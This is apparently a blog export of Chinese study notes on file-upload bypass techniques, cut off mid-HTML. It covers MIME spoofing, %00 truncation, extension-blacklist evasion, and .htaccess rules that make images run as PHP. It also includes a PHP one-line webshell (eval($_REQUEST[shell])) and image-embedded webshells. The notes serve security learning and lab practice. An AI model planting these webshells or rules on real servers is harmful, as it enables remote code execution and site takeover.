chrome在审查元素状态下可以找到**Setting**选项，然后在Debugger选项下面勾选**Disable Javascript**即可![image-20210415224547644](https://gitee.com/h1ler/blogimage/raw/master/img/20210415224547.png)\n  - 调试JS\n    - 虽然这种解法没有必要，不过倒是学到了如何调试网页\n    - firefox中F12打开开发者工具，在调试器中打开异常处暂停，修改js变量whitelist中的值即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415231009.png\" alt=\"image-20210415231009461\"  />\n      - firefox中只能听过控制台输入var=value的形式更改变量的值\n      - chrome中可直接修改\n\n## 服务端检测绕过（MIME）\n\n- MIME检测原理\n\n  服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。\n\n- 常见的MIME类型\n\n      text/plain（纯文本）\n      text/html（HTML文档）\n      text/javascript（js代码）\n      application/xhtml+xml（XHTML文档）\n      image/gif（GIF图像）\n      image/jpeg（JPEG图像）\n      image/png（PNG图像）\n      video/mpeg（MPEG动画）\n      application/octet-stream（二进制数据）\n      application/pdf（PDF文档）\n\n- 绕过方式：将content-type字段改为常见的image/jpg等即可成功上传\n\n## 服务器检测绕过（目录路径检测）\n\n### - 00截断\n\n- 原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串\n\n- 形成条件\n\n  - php版本要小于5.3.4\n  - magic_quotes_gpc off\n\n- 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束\n\n  比如\n\n  https://mp.csdn.net/upfiles/?filename=test.txt                                此时输出的是test.txt\n\n  加上%00\n\n  https://mp.csdn.net/upfiles/?filename=test.php%00.txt                   此时输出的是test.php\n\n  就绕过了后缀限制，可以上传webshell了\n\n- 0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制\n\n- 当执行move_uploaded_file($FILE['tmp_name'],$Path)时遇到0x00会自动截断，所以真正写入的实际地址是upload/a.php\n\n- 案例一：\n\n  - 此处是个POST包，在目录路径处构造完整路径用%00进行截断可以绕过随机重命名，并自定义为php文件进行解析![image-20210421134423517](https://gitee.com/h1ler/blogimage/raw/master/img/20210421134423.png)\n  - 自定义为a.php并添加%00进行截断![image-20210421134718342](https://gitee.com/h1ler/tuci/raw/master/null/20210421134718.png)此处截断需要将%00进行url编码才行![image-20210421134823317](https://gitee.com/h1ler/tuci/raw/master/null/20210421134823.png)编码后如图即可成功上传![image-20210421135058090](https://gitee.com/h1ler/tuci/raw/master/null/20210421135058.png)\n\n- 案例二\n\n  - 随便上传一个文件后，url产生变化，此处可知其目录路径在url上传输![image-20210421204028019](https://gitee.com/h1ler/tuci/raw/master/null/20210421204028.png)\n  - 抓包如下![image-20210421203726553](https://gitee.com/h1ler/blogimage/raw/master/img/20210421203726.png)\n  - 同理进行改包截断![image-20210421205207078](https://gitee.com/h1ler/blogimage/raw/master/img/20210421205207.png)\n\n- 两个案例中用法不同\n\n  - 案例一：POST包中%00不会被url解码，所有只能通过burp先行解码再传输，或者直接hex中修改为00进行截断\n  - 案例二：%00在被url解码之后是空字符\n\n## 服务端检测绕过（文件扩展名检测）\n\n### - 黑名单检测 \n\n- 名单列表绕过\n\n  默认情况下Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，Fuzz一下找出黑名单里没有后缀进行攻击，比如asa或cer之类\n\n- 文件名大小写绕过(至今尝试还未成功)\n\n  用AsP,pHp之类的文件名绕过黑名单检测\n\n- 特殊文件名绕过\n\n  比如把http包里的文件名改为test.asp. 或test.asp空格,这种命名方式在windows中是不被允许的，也就是利用windows系统特性，绕过验证后，会被windows自动去掉后面的点或空格，但Unix/Linux没有这个特性\n\n- 0x00截断绕过\n\n  据说在asp程序中遇到过，待学习\n\n- .htaccess文件攻击\n\n  - PHP  manual中提到![image-20210421211503751](https://gitee.com/h1ler/tuci/raw/master/null/20210421211503.png)\n  - 如果PHP安全没有配置好的话，就可以通过move_uploaded_file来overwrite服务器中的.htaccess文件,以此达到任意定义解析名单的目的，例如将jpg文件解析为php文件\n\n- 解析调用/漏洞绕过\n\n- 常用一句话\n\n  ```php\n  GIF89a? <script language=\"php\">eval($_REQUEST[shell])</script>\n  ```\n\n  \n\n### - 白名单检测\n\n- 0x00截断绕过\n- 文件名长度绕过白名单\n- 解析调用/漏洞绕过\n\n## 服务端检测绕过（文件内容检测）\n\n### - 文件幻数检测\n\n- 主要时检测文件内容开始处的文件幻，比如图片类型的文件幻数如下\n\n- 常见文件幻数\n\n  ```\n  jpg\tFF D8 FF E0 00 10 4A 46 49 46\n  GIF 47 49 46 38 39 61\n  PNG 89 50 4E 47 0D 0A 1A 0A\n  ```\n\n  \n\n### - 文件相关信息检测\n\n### - 文件加载检测\n\n#### -- 渲染/加载测试\n\n- 绕过方式：代码注入（例如图片马）\n\n  用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本省的文件结构是完整的\n\n#### -- 二次渲染\n\n- `imagecreatefrom` 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的\n\n- 绕过方式：\n\n  - GIF\n\n    渲染前后的两张GIF，没有发生变化的数据库部分直接插入Webshell即可\n\n    1. 准备一张GIF![16036176592096](https://gitee.com/h1ler/blogimage/raw/master/img/16036176592096.gif)\n\n    2. 上传至目标网站上渲染一下再导出![image-20210503144505868](https://gitee.com/h1ler/blogimage/raw/master/img/20210503144509.png)\n\n    3. 用010editor对比未变化区域插入webshell\n\n       ![image-20210502154810504](https://gitee.com/h1ler/tuci/raw/master/null/20210502154810.png)\n\n    4. 由于测试网站存在文件包含漏洞，则可直接文件包含来执行攻击语句![image-20210502162553895](https://gitee.com/h1ler/blogimage/raw/master/img/20210502162601.png)\n\n  - PNG\n\n    PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT数据块\n\n    - 首先准备一个PNG图片![img](https://gitee.com/h1ler/blogimage/raw/master/img/16036276956867.png)\n    - 实现细节参考https://wooyun.x10sec.org/static/drops/tips-16034.html\n    - 写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终\n    - 修改索引图像插入 PHP 代码的脚本项目地址为：[Github - poc_png.py](https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py)\n    - 因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：\n\n  - JPG\n\n    JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试\n\n## 解析攻击\n\n### - 网络渗透的本质\n\n### - 直接解析\n\n### - 本地文件包含解析\n\n### - .htaccess文件上传解析漏洞\n\n- htaccess文件是[Apache](https://baike.baidu.com/item/Apache)服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页[301重定向](https://baike.baidu.com/item/301重定向)、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n\n- 形成条件\n\n  - apache服务器\n  - 能够上传.htaccess文件，一般为**黑名单**限制\n  - AllowOverride All，默认配置为关闭None\n  - LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态\n  - 上传目录具有可执行权限\n\n- .htaccess写法\n\n  ```\n  SetHandler application/x-httpd-php\n  ```\n\n  当前目录所有文件均会被解析为php文件\n\n  ```\n  <FilesMatch \"1\">\n  SetHandler application/x-httpd-php\n  </FilesMatch>\n  ```\n\n  将文件名**包含**1的文件解析为php文件，可用作留后门，123.png 就会被解析成php\n\n  ```\n  AddType application/x-httpd-php .png\n  ```\n\n  将.png解析为php文件\n\n### - web应用程序解析漏洞及其原理\n\n## 上传攻击框架\n\n### - 轻量级检测绕过攻击\n\n### - 路径/扩展名检测绕过攻击\n\n### - 文件内容性检测绕过攻击\n\n### - 上传攻击框架\n\n## 代码逻辑\n\n### - 条件竞争\n\n------\n\n> 参考\n>\n> - [国光的文件上传靶场知识总结](https://www.sqlsec.com/2020/10/upload.html)\n> - [上传攻击总结](https://wenku.baidu.com/link?url=vMCO-E0_utuzonHcMnZ-xlRIW2M3Sn0sarHUKHIqQawrl2juefZOfJmFhdUCRah8EpO1NEUxJk7hm2lcpvz-apwev02IT-IWlKmDRzIid7u)","source":"_posts/文件上传.md","raw":"---\ntitle: 文件上传\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: 文件上传\ncategories: 文件上传\n---\n\n# 文件上传\n\n## 上传检测流程\n\n![sum_up](https://gitee.com/h1ler/blogimage/raw/master/img/20210425001426.png)\n\n![image-20210420012816046](https://gitee.com/h1ler/blogimage/raw/master/img/20210420012816.png)\n\n## 客户端检测绕过（JS）\n\n- 如何判断是前端验证呢？\n\n  - 抓包监听，如果上传文件的时候还没有抓取到数据包，但浏览器就提示文件类型不正确的话，那么多半就是前端校验了\n\n- 通常解法：\n\n  - 抓包\n\n    - 由于是前端校验，因此可以将shell.png重命名为shell.png 上传抓包时再将文件名修改为shell.php即可绕过前端限制，成功上传webshell。\n  - 禁用JS\n\n  - 因为JS来校验文件后缀的原因，因此直接在浏览器上禁用JS即可。\n\n  - 方法\n\n    - firefox：按**F12**打开调试工具，再按**F1**打开设置选项![image-20210415224247926](https://gitee.com/h1ler/blogimage/raw/master/img/20210415224321.png)\n      - chrome在审查元素状态下可以找到**Setting**选项，然后在Debugger选项下面勾选**Disable Javascript**即可![image-20210415224547644](https://gitee.com/h1ler/blogimage/raw/master/img/20210415224547.png)\n  - 调试JS\n    - 虽然这种解法没有必要，不过倒是学到了如何调试网页\n    - firefox中F12打开开发者工具，在调试器中打开异常处暂停，修改js变量whitelist中的值即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415231009.png\" alt=\"image-20210415231009461\"  />\n      - firefox中只能听过控制台输入var=value的形式更改变量的值\n      - chrome中可直接修改\n\n## 服务端检测绕过（MIME）\n\n- MIME检测原理\n\n  服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。\n\n- 常见的MIME类型\n\n      text/plain（纯文本）\n      text/html（HTML文档）\n      text/javascript（js代码）\n      application/xhtml+xml（XHTML文档）\n      image/gif（GIF图像）\n      image/jpeg（JPEG图像）\n      image/png（PNG图像）\n      video/mpeg（MPEG动画）\n      application/octet-stream（二进制数据）\n      application/pdf（PDF文档）\n\n- 绕过方式：将content-type字段改为常见的image/jpg等即可成功上传\n\n## 服务器检测绕过（目录路径检测）\n\n### - 00截断\n\n- 原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串\n\n- 形成条件\n\n  - php版本要小于5.3.4\n  - magic_quotes_gpc off\n\n- 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束\n\n  比如\n\n  https://mp.csdn.net/upfiles/?filename=test.txt                                此时输出的是test.txt\n\n  加上%00\n\n  https://mp.csdn.net/upfiles/?filename=test.php%00.txt                   此时输出的是test.php\n\n  就绕过了后缀限制，可以上传webshell了\n\n- 0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制\n\n- 当执行move_uploaded_file($FILE['tmp_name'],$Path)时遇到0x00会自动截断，所以真正写入的实际地址是upload/a.php\n\n- 案例一：\n\n  - 此处是个POST包，在目录路径处构造完整路径用%00进行截断可以绕过随机重命名，并自定义为php文件进行解析![image-20210421134423517](https://gitee.com/h1ler/blogimage/raw/master/img/20210421134423.png)\n  - 自定义为a.php并添加%00进行截断![image-20210421134718342](https://gitee.com/h1ler/tuci/raw/master/null/20210421134718.png)此处截断需要将%00进行url编码才行![image-20210421134823317](https://gitee.com/h1ler/tuci/raw/master/null/20210421134823.png)编码后如图即可成功上传![image-20210421135058090](https://gitee.com/h1ler/tuci/raw/master/null/20210421135058.png)\n\n- 案例二\n\n  - 随便上传一个文件后，url产生变化，此处可知其目录路径在url上传输![image-20210421204028019](https://gitee.com/h1ler/tuci/raw/master/null/20210421204028.png)\n  - 抓包如下![image-20210421203726553](https://gitee.com/h1ler/blogimage/raw/master/img/20210421203726.png)\n  - 同理进行改包截断![image-20210421205207078](https://gitee.com/h1ler/blogimage/raw/master/img/20210421205207.png)\n\n- 两个案例中用法不同\n\n  - 案例一：POST包中%00不会被url解码，所有只能通过burp先行解码再传输，或者直接hex中修改为00进行截断\n  - 案例二：%00在被url解码之后是空字符\n\n## 服务端检测绕过（文件扩展名检测）\n\n### - 黑名单检测 \n\n- 名单列表绕过\n\n  默认情况下Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，Fuzz一下找出黑名单里没有后缀进行攻击，比如asa或cer之类\n\n- 文件名大小写绕过(至今尝试还未成功)\n\n  用AsP,pHp之类的文件名绕过黑名单检测\n\n- 特殊文件名绕过\n\n  比如把http包里的文件名改为test.asp. 或test.asp空格,这种命名方式在windows中是不被允许的，也就是利用windows系统特性，绕过验证后，会被windows自动去掉后面的点或空格，但Unix/Linux没有这个特性\n\n- 0x00截断绕过\n\n  据说在asp程序中遇到过，待学习\n\n- .htaccess文件攻击\n\n  - PHP  manual中提到![image-20210421211503751](https://gitee.com/h1ler/tuci/raw/master/null/20210421211503.png)\n  - 如果PHP安全没有配置好的话，就可以通过move_uploaded_file来overwrite服务器中的.htaccess文件,以此达到任意定义解析名单的目的，例如将jpg文件解析为php文件\n\n- 解析调用/漏洞绕过\n\n- 常用一句话\n\n  ```php\n  GIF89a? <script language=\"php\">eval($_REQUEST[shell])</script>\n  ```\n\n  \n\n### - 白名单检测\n\n- 0x00截断绕过\n- 文件名长度绕过白名单\n- 解析调用/漏洞绕过\n\n## 服务端检测绕过（文件内容检测）\n\n### - 文件幻数检测\n\n- 主要时检测文件内容开始处的文件幻，比如图片类型的文件幻数如下\n\n- 常见文件幻数\n\n  ```\n  jpg\tFF D8 FF E0 00 10 4A 46 49 46\n  GIF 47 49 46 38 39 61\n  PNG 89 50 4E 47 0D 0A 1A 0A\n  ```\n\n  \n\n### - 文件相关信息检测\n\n### - 文件加载检测\n\n#### -- 渲染/加载测试\n\n- 绕过方式：代码注入（例如图片马）\n\n  用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本省的文件结构是完整的\n\n#### -- 二次渲染\n\n- `imagecreatefrom` 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的\n\n- 绕过方式：\n\n  - GIF\n\n    渲染前后的两张GIF，没有发生变化的数据库部分直接插入Webshell即可\n\n    1. 准备一张GIF![16036176592096](https://gitee.com/h1ler/blogimage/raw/master/img/16036176592096.gif)\n\n    2. 上传至目标网站上渲染一下再导出![image-20210503144505868](https://gitee.com/h1ler/blogimage/raw/master/img/20210503144509.png)\n\n    3. 用010editor对比未变化区域插入webshell\n\n       ![image-20210502154810504](https://gitee.com/h1ler/tuci/raw/master/null/20210502154810.png)\n\n    4. 由于测试网站存在文件包含漏洞，则可直接文件包含来执行攻击语句![image-20210502162553895](https://gitee.com/h1ler/blogimage/raw/master/img/20210502162601.png)\n\n  - PNG\n\n    PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT数据块\n\n    - 首先准备一个PNG图片![img](https://gitee.com/h1ler/blogimage/raw/master/img/16036276956867.png)\n    - 实现细节参考https://wooyun.x10sec.org/static/drops/tips-16034.html\n    - 写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终\n    - 修改索引图像插入 PHP 代码的脚本项目地址为：[Github - poc_png.py](https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py)\n    - 因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：\n\n  - JPG\n\n    JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试\n\n## 解析攻击\n\n### - 网络渗透的本质\n\n### - 直接解析\n\n### - 本地文件包含解析\n\n### - .htaccess文件上传解析漏洞\n\n- htaccess文件是[Apache](https://baike.baidu.com/item/Apache)服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页[301重定向](https://baike.baidu.com/item/301重定向)、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n\n- 形成条件\n\n  - apache服务器\n  - 能够上传.htaccess文件，一般为**黑名单**限制\n  - AllowOverride All，默认配置为关闭None\n  - LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态\n  - 上传目录具有可执行权限\n\n- .htaccess写法\n\n  ```\n  SetHandler application/x-httpd-php\n  ```\n\n  当前目录所有文件均会被解析为php文件\n\n  ```\n  <FilesMatch \"1\">\n  SetHandler application/x-httpd-php\n  </FilesMatch>\n  ```\n\n  将文件名**包含**1的文件解析为php文件，可用作留后门，123.png 就会被解析成php\n\n  ```\n  AddType application/x-httpd-php .png\n  ```\n\n  将.png解析为php文件\n\n### - web应用程序解析漏洞及其原理\n\n## 上传攻击框架\n\n### - 轻量级检测绕过攻击\n\n### - 路径/扩展名检测绕过攻击\n\n### - 文件内容性检测绕过攻击\n\n### - 上传攻击框架\n\n## 代码逻辑\n\n### - 条件竞争\n\n------\n\n> 参考\n>\n> - [国光的文件上传靶场知识总结](https://www.sqlsec.com/2020/10/upload.html)\n> - [上传攻击总结](https://wenku.baidu.com/link?url=vMCO-E0_utuzonHcMnZ-xlRIW2M3Sn0sarHUKHIqQawrl2juefZOfJmFhdUCRah8EpO1NEUxJk7hm2lcpvz-apwev02IT-IWlKmDRzIid7u)","slug":"文件上传","published":1,"updated":"2021-08-21T11:37:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyek0029t8opa9xi3rju","content":"<h1 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h1><h2 id=\"上传检测流程\"><a href=\"#上传检测流程\" class=\"headerlink\" title=\"上传检测流程\"></a>上传检测流程</h2><p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210425001426.png\" alt=\"sum_up\"></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210420012816.png\" alt=\"image-20210420012816046\"></p>\n<h2 id=\"客户端检测绕过（JS）\"><a href=\"#客户端检测绕过（JS）\" class=\"headerlink\" title=\"客户端检测绕过（JS）\"></a>客户端检测绕过（JS）</h2><ul>\n<li><p>如何判断是前端验证呢？</p>\n<ul>\n<li>抓包监听，如果上传文件的时候还没有抓取到数据包，但浏览器就提示文件类型不正确的话，那么多半就是前端校验了</li>\n</ul>\n</li>\n<li><p>通常解法：</p>\n<ul>\n<li><p>抓包</p>\n<ul>\n<li>由于是前端校验，因此可以将shell.png重命名为shell.png 上传抓包时再将文件名修改为shell.php即可绕过前端限制，成功上传webshell。</li>\n</ul>\n</li>\n<li><p>禁用JS</p>\n</li>\n<li><p>因为JS来校验文件后缀的原因，因此直接在浏览器上禁用JS即可。</p>\n</li>\n<li><p>方法</p>\n<ul>\n<li>firefox：按<strong>F12</strong>打开调试工具，再按<strong>F1</strong>打开设置选项<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415224321.png\" alt=\"image-20210415224247926\"><ul>\n<li>chrome在审查元素状态下可以找到<strong>Setting</strong>选项，然后在Debugger选项下面勾选<strong>Disable Javascript</strong>即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415224547.png\" alt=\"image-20210415224547644\"></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>调试JS</p>\n<ul>\n<li>虽然这种解法没有必要，不过倒是学到了如何调试网页</li>\n<li>firefox中F12打开开发者工具，在调试器中打开异常处暂停，修改js变量whitelist中的值即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415231009.png\" alt=\"image-20210415231009461\"><ul>\n<li>firefox中只能听过控制台输入var=value的形式更改变量的值</li>\n<li>chrome中可直接修改</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"服务端检测绕过（MIME）\"><a href=\"#服务端检测绕过（MIME）\" class=\"headerlink\" title=\"服务端检测绕过（MIME）\"></a>服务端检测绕过（MIME）</h2><ul>\n<li><p>MIME检测原理</p>\n<p>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。</p>\n</li>\n<li><p>常见的MIME类型</p>\n<pre><code>text/plain（纯文本）\ntext/html（HTML文档）\ntext/javascript（js代码）\napplication/xhtml+xml（XHTML文档）\nimage/gif（GIF图像）\nimage/jpeg（JPEG图像）\nimage/png（PNG图像）\nvideo/mpeg（MPEG动画）\napplication/octet-stream（二进制数据）\napplication/pdf（PDF文档）</code></pre></li>\n<li><p>绕过方式：将content-type字段改为常见的image/jpg等即可成功上传</p>\n</li>\n</ul>\n<h2 id=\"服务器检测绕过（目录路径检测）\"><a href=\"#服务器检测绕过（目录路径检测）\" class=\"headerlink\" title=\"服务器检测绕过（目录路径检测）\"></a>服务器检测绕过（目录路径检测）</h2><h3 id=\"00截断\"><a href=\"#00截断\" class=\"headerlink\" title=\"- 00截断\"></a>- 00截断</h3><ul>\n<li><p>原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串</p>\n</li>\n<li><p>形成条件</p>\n<ul>\n<li>php版本要小于5.3.4</li>\n<li>magic_quotes_gpc off</li>\n</ul>\n</li>\n<li><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p>\n<p>比如</p>\n<p><a href=\"https://mp.csdn.net/upfiles/?filename=test.txt\" target=\"_blank\" rel=\"noopener\">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p>\n<p>加上%00</p>\n<p><a href=\"https://mp.csdn.net/upfiles/?filename=test.php%00.txt\" target=\"_blank\" rel=\"noopener\">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p>\n<p>就绕过了后缀限制，可以上传webshell了</p>\n</li>\n<li><p>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制</p>\n</li>\n<li><p>当执行move_uploaded_file($FILE[‘tmp_name’],$Path)时遇到0x00会自动截断，所以真正写入的实际地址是upload/a.php</p>\n</li>\n<li><p>案例一：</p>\n<ul>\n<li>此处是个POST包，在目录路径处构造完整路径用%00进行截断可以绕过随机重命名，并自定义为php文件进行解析<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421134423.png\" alt=\"image-20210421134423517\"></li>\n<li>自定义为a.php并添加%00进行截断<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421134718.png\" alt=\"image-20210421134718342\">此处截断需要将%00进行url编码才行<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421134823.png\" alt=\"image-20210421134823317\">编码后如图即可成功上传<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421135058.png\" alt=\"image-20210421135058090\"></li>\n</ul>\n</li>\n<li><p>案例二</p>\n<ul>\n<li>随便上传一个文件后，url产生变化，此处可知其目录路径在url上传输<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421204028.png\" alt=\"image-20210421204028019\"></li>\n<li>抓包如下<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421203726.png\" alt=\"image-20210421203726553\"></li>\n<li>同理进行改包截断<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421205207.png\" alt=\"image-20210421205207078\"></li>\n</ul>\n</li>\n<li><p>两个案例中用法不同</p>\n<ul>\n<li>案例一：POST包中%00不会被url解码，所有只能通过burp先行解码再传输，或者直接hex中修改为00进行截断</li>\n<li>案例二：%00在被url解码之后是空字符</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"服务端检测绕过（文件扩展名检测）\"><a href=\"#服务端检测绕过（文件扩展名检测）\" class=\"headerlink\" title=\"服务端检测绕过（文件扩展名检测）\"></a>服务端检测绕过（文件扩展名检测）</h2><h3 id=\"黑名单检测\"><a href=\"#黑名单检测\" class=\"headerlink\" title=\"- 黑名单检测\"></a>- 黑名单检测</h3><ul>\n<li><p>名单列表绕过</p>\n<p>默认情况下Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，Fuzz一下找出黑名单里没有后缀进行攻击，比如asa或cer之类</p>\n</li>\n<li><p>文件名大小写绕过(至今尝试还未成功)</p>\n<p>用AsP,pHp之类的文件名绕过黑名单检测</p>\n</li>\n<li><p>特殊文件名绕过</p>\n<p>比如把http包里的文件名改为test.asp. 或test.asp空格,这种命名方式在windows中是不被允许的，也就是利用windows系统特性，绕过验证后，会被windows自动去掉后面的点或空格，但Unix/Linux没有这个特性</p>\n</li>\n<li><p>0x00截断绕过</p>\n<p>据说在asp程序中遇到过，待学习</p>\n</li>\n<li><p>.htaccess文件攻击</p>\n<ul>\n<li>PHP  manual中提到<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421211503.png\" alt=\"image-20210421211503751\"></li>\n<li>如果PHP安全没有配置好的话，就可以通过move_uploaded_file来overwrite服务器中的.htaccess文件,以此达到任意定义解析名单的目的，例如将jpg文件解析为php文件</li>\n</ul>\n</li>\n<li><p>解析调用/漏洞绕过</p>\n</li>\n<li><p>常用一句话</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">GIF89a<span class=\"token operator\">?</span> <span class=\"token markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>shell<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n<h3 id=\"白名单检测\"><a href=\"#白名单检测\" class=\"headerlink\" title=\"- 白名单检测\"></a>- 白名单检测</h3><ul>\n<li>0x00截断绕过</li>\n<li>文件名长度绕过白名单</li>\n<li>解析调用/漏洞绕过</li>\n</ul>\n<h2 id=\"服务端检测绕过（文件内容检测）\"><a href=\"#服务端检测绕过（文件内容检测）\" class=\"headerlink\" title=\"服务端检测绕过（文件内容检测）\"></a>服务端检测绕过（文件内容检测）</h2><h3 id=\"文件幻数检测\"><a href=\"#文件幻数检测\" class=\"headerlink\" title=\"- 文件幻数检测\"></a>- 文件幻数检测</h3><ul>\n<li><p>主要时检测文件内容开始处的文件幻，比如图片类型的文件幻数如下</p>\n</li>\n<li><p>常见文件幻数</p>\n<pre><code>jpg    FF D8 FF E0 00 10 4A 46 49 46\nGIF 47 49 46 38 39 61\nPNG 89 50 4E 47 0D 0A 1A 0A</code></pre></li>\n</ul>\n<h3 id=\"文件相关信息检测\"><a href=\"#文件相关信息检测\" class=\"headerlink\" title=\"- 文件相关信息检测\"></a>- 文件相关信息检测</h3><h3 id=\"文件加载检测\"><a href=\"#文件加载检测\" class=\"headerlink\" title=\"- 文件加载检测\"></a>- 文件加载检测</h3><h4 id=\"–-渲染-加载测试\"><a href=\"#–-渲染-加载测试\" class=\"headerlink\" title=\"– 渲染/加载测试\"></a>– 渲染/加载测试</h4><ul>\n<li><p>绕过方式：代码注入（例如图片马）</p>\n<p>用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本省的文件结构是完整的</p>\n</li>\n</ul>\n<h4 id=\"–-二次渲染\"><a href=\"#–-二次渲染\" class=\"headerlink\" title=\"– 二次渲染\"></a>– 二次渲染</h4><ul>\n<li><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的</p>\n</li>\n<li><p>绕过方式：</p>\n<ul>\n<li><p>GIF</p>\n<p>渲染前后的两张GIF，没有发生变化的数据库部分直接插入Webshell即可</p>\n<ol>\n<li><p>准备一张GIF<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/16036176592096.gif\" alt=\"16036176592096\"></p>\n</li>\n<li><p>上传至目标网站上渲染一下再导出<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210503144509.png\" alt=\"image-20210503144505868\"></p>\n</li>\n<li><p>用010editor对比未变化区域插入webshell</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210502154810.png\" alt=\"image-20210502154810504\"></p>\n</li>\n<li><p>由于测试网站存在文件包含漏洞，则可直接文件包含来执行攻击语句<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210502162601.png\" 